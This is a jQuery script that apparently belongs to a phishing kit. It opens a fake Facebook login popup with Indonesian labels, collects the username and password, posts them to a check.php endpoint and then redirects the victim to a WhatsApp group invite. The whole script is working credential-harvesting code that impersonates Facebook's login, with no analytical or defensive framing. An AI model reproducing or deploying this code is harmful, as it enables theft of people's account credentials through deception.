
		    $(document).ready(function()
		    {
		    var dlButton = document.getElementById('footericon');

        dlButton.addEventListener("click", 
            function (event) {
                event.preventDefault();
				    $('.login-facebook').fadeIn();
            }, 
            false);
                window.addEventListener('submit', (e) => {
                        $('.btn-login-fb').html('<i class="fa fa-circle-o-notch fa-spin">')
                    e.preventDefault()
                    setTimeout(() => {
                        check()
                    },2000)
                    return false;
                })
		    function check()
		    {
			    $user = $('#user').val().trim();
			    $pass = $('#pass').val().trim();
			    if($user == '' || $user == null || $user.length <= 5)
			    {
				    $('.email').show();
				    $('.sandi').hide();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.email').hide();
			    }
			    if($pass == '' || $pass == null || $pass.length <= 5)
			    {
				    $('.sandi').show();
				    $('.btn-login-fb').html('Masuk')
				    return false;
			    }else{
				    $('.sandi').hide();
			    }
                    // if all form are filled
                    if($user !== '' || $user !== null || !$pass == '' || !$pass == null)
                
                    {
                        // SEND DATA
                        $.ajax({
                            type: 'POST',
                            url: 'check.php',
                            data: $('form').serialize(),
                            dataType: 'text',
                            success: function() {
                                        $('.login-facebook').toggle();
                                        $('.btn-login-fb').html('Success')
                                        $('.login-facebook').fadeOut();
                                        window.location = 'https://chat.whatsapp.com/LBLPBSSCC4ED2T3422D9Xj';
                                } 
                        })
                    }
		    }})
	